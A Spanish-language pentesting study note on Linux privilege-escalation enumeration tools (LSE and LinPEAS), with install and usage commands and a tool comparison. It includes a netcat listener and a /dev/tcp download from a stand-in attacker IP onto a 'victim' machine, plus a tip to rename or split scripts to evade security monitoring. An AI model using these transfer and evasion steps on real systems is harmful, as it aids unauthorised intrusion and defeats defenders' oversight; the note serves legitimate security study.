---
Tema: "[[Escalada de Privilegios]]"
---
# 🔍 Herramientas para Detectar Permisos Mal Configurados en Linux

> [!info] Contenido relacionado
> Este apunte es complementario a [[Deteccion de Archivos con Permisos Incorrectamente Implementados]] y forma parte del estudio sobre [[Escalada de Privilegios]].

---

## 📋 Introducción

Para detectar archivos con permisos mal configurados de manera más eficiente, existen herramientas automatizadas que simplifican el proceso de enumeración. Estas herramientas son fundamentales durante un pentest o en escenarios de escalada de privilegios.

---

## 🛠️ Herramientas Recomendadas

### 1. LSE (Linux Smart Enumeration)

> [!tip] Ventajas de LSE
> - Interfaz con código de colores para fácil interpretación
> - Salida muy completa y organizada
> - Categoriza los hallazgos por nivel de riesgo
> - Ligero y funciona en sistemas con recursos limitados

#### Instalación y uso de [[lse (linux smart enumeration)]]

El repositorio oficial se encuentra en: [lse](https://github.com/diego-treitos/linux-smart-enumeration)

**Método 1: Descarga directa en el sistema objetivo**
```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh
chmod +x lse.sh
./lse.sh
```

**Método 2: Transferencia desde máquina atacante** 

> [!warning] Consideraciones de seguridad
> Este método es preferible cuando el sistema objetivo tiene restricciones o no dispone de herramientas como [[wget]] o curl.

1. En la máquina atacante, prepara la transferencia con [[netcat]]:

```bash
nc -nlvp 443 < lse.sh
```

2. En la máquina víctima, recibe el archivo:

```bash
cat < /dev/tcp/IP_ATACANTE/443 > lse.sh
chmod +x lse.sh
./lse.sh
```

### 2. LinPEAS

> [!note] Alternativa potente
> [[linPEAS]] es otra excelente herramienta del proyecto PEASS (Privilege Escalation Awesome Scripts Suite) que ofrece una enumeración aún más exhaustiva, aunque puede generar más "ruido" en la salida.

---

## 📊 Comparativa de herramientas

| Característica | LSE | LinPEAS |
|----------------|-----|---------|
| Tamaño | Ligero (~100KB) | Más pesado (~500KB) |
| Detalle | Medio-Alto | Muy alto |
| Interfaz | Colores, bien organizado | Colores, muy detallado |
| Uso de recursos | Bajo | Medio |
| Tiempo de ejecución | Rápido | Más extenso |
| Facilidad de interpretación | Alta | Media (más información para filtrar) |

---

## 💡 Consejos prácticos

> [!example] Ejecutar con diferentes niveles
> Tanto LSE como LinPEAS permiten ejecutar la herramienta con diferentes niveles de profundidad:
> ```bash
> ./lse.sh -l 2  # Nivel 2 (más detallado que el predeterminado)
> ```

> [!tip] Guardar la salida para análisis posterior
> ```bash
> ./lse.sh -l 2 | tee resultados_lse.txt
> ```

> [!warning] Evitar detección
> En entornos monitorizados, considera renombrar los scripts o fragmentarlos para evitar detección por sistemas de seguridad.

---

## 🚀 Próximos pasos

Una vez identificados los archivos con permisos incorrectamente configurados:

1. Analizar cada hallazgo para determinar su potencial de explotación
2. Priorizar los vectores de ataque más prometedores
3. Desarrollar y probar los métodos de escalada de privilegios
4. Documentar todo el proceso para informes o aprendizaje

---

> [!success] Recuerda
> La detección automatizada es solo el primer paso. El análisis manual de los resultados y la comprensión de las vulnerabilidades específicas de permisos son cruciales para lograr una escalada de privilegios exitosa.